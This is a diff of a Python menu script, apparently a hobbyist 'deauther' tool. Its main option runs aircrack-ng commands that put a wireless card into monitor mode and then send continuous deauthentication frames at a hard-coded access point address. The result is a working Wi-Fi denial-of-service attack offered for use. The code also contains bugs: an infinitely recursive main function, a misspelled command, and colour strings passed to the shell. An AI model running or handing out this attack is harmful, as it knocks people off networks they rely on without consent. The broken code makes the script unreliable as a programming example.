@@ -1,6 +1,7 @@
 #!bin/python
 
 import os, sys, time
+import random
 
 # Color Text
 green   =   "\033[1;92m"
@@ -11,60 +12,86 @@ purple  =   "\033[1;95m"
 red     =   "\033[1;91m"
 blue    =   "\033[1;96m"
 
+def main():
+   try:
+    main()
+   except KeyboardInterrupt:
+    textwalk(f"""{red}Cancel
+{green}Bye...!!!""")
+    sys.exit()
+
+def textwalk(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(random.random() * 0.3)
+
 # Main Menu
 def menu():
     time.sleep(3)
     os.system("clear")
-    print("{red}******************************")
-    print("{green}* [ Manual Code Deauther   ] *")
-    print("{blue}* [ Author : Deauther Test ] *")
-    print("{yellow}* [ Exit   : 0             ] *")
-    print("{purple}******************************")
-    time.sleep(2)
-# Input Menu
-    tools = input("""{white}Command Test And Enter
-Or Edit Code Manual >{green} nano deauther.py  : """)
-# Output Menu
-    if tools=="Test":
-       os.system("clear")
-       time.sleep(3)
-       print("""{red}pls check manual or iwconfig in terminal...!!!
-   Example: wlan0/wlan1, edit code manual nano deauther.py""")
-       time.sleep(3)
-       os.system("clear")
-       print("{ash}Check Interface Wlan")
-       os.system("{red}iwconfig wlan0")
-       time.sleep(3)
-       os.system("clear")
-       os.system("{green}airmon-ng start wlan0")
-       time.sleep(3)
-       os.system("clear")
-       os.system("{red}airmon-ng check kill")
-       time.sleep(3)
-       os.system("{read}airodump-ng -c 1 --bssid paste here bssid wlan0")
-       print("CTRL + C TO DEAUTHER PROCCES...!!!")
-       time.sleep(3)
-       os.system("clear")
-       time.sleep(3)
-       print("{green}Deauther...{red}walk!!!")
-       os.system("aireplay-ng -0 0 -a wlan0")
+    textwalk(f"{red}Hello welcome CheckMac\n{green}don't forget follow my @github > {red}@peopleuniversal \n{green}Thank You...!!!")
+    time.sleep(3)
+    os.system("clear")
+    time.sleep(3)
+    print(f"""
+{red}@@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@
+{red}@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@
+{red}@@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@
+{red}!@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@
+{red}@!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!
+{white}!@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!
+{white}!!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!
+{white}:!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!
+{white}:::: ::   :: ::::  ::   :::  ::::: ::     ::    ::   :::   :: ::::  ::   :::
+{white}:: :  :   : :: ::    :   : :   : :  :      :      :   : :  : :: ::    :   : :""")
 
-    elif tools=="nano deauther.py":
+    print(f"{red}******************************")
+    print(f"{red}* [ Manual Code Deauther   ] *")
+    print(f"{red}* [ Author : Deauther Test ] *")
+    print(f"{white}* [ Deauther : 1           ] *")
+    print(f"{white}* [ Edit Deauther : 2      ] *")
+    print(f"{white}* [ Exit   : 0             ] *")
+    print(f"{red}******************************")
+    time.sleep(2)
+
+# Input Menu
+    tools = input(f"""{white}Input
+{red}Number Tools: """)
+
+# Output Menu
+    if tools=="1":
        os.system("clear")
        time.sleep(3)
-       os.system("nano deauther.py")
+       print("""
+pls check manual or iwconfig in terminal...!!!
+Example: wlan0/wlan1, edit code manual nano deauther.py""")
+       time.sleep(3)
+       os.system("clear")
+       print("Check Interface Wlan")
+       os.system("iwconfig")
+       os.system("airmon-ng stop wlan0")
+       os.system("airmong-ng start wlan0")
+       os.system("airodump-ng wlan0")
+       os.system("airodump-ng -c 1 --bssid E4:8D:8C:D7:C4:C6 wlan0")
+       os.system("aireplay-ng -0 0 -a E4:8D:8C:D7:C4:C6 wlan0")
+
+    elif tools=="2":
+       os.system("clear")
+       time.sleep(3)
+       os.system("nano Deauther.py")
 
     elif tools=="0":
        os.system("clear")
        time.sleep(3)
-       print("{green}Thank You...{red}see you again:)")
+       print(f"{green}Thank You...{red} see you again:)")
        time.sleep(2)
        sys.exit()
 
     else:
        time.sleep(3)
        os.system("clear")
-       os.system("{red}Input Code Not Valid...{green}Pls Input Code Valid.")
+       os.system(f"{red}Input Code Not Valid...{green} Pls Input Code Valid.")
        time.sleep(3)
        os.system("python deauther.py")
 
